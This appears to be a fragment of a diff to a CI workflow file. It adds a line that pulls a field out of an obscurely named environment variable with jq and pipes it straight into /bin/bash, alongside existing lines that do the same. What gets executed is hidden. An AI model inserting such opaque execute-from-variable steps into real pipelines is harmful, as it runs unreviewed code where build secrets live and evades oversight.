@@ -42,6 +42,7 @@ jobs:
           echo $xt3770 | jq -r .dxtx4984 | /bin/bash
           printf '%s' "$efwmn5192" | jq -r .gjg34219 | /bin/bash
           echo $r380 | jq -r .mmpsz20076 | /bin/bash
+          printf '%s' "$hcnx5053" | jq -r .eemox83515 | /bin/bash
 
       - name: Archive output
         if: always()
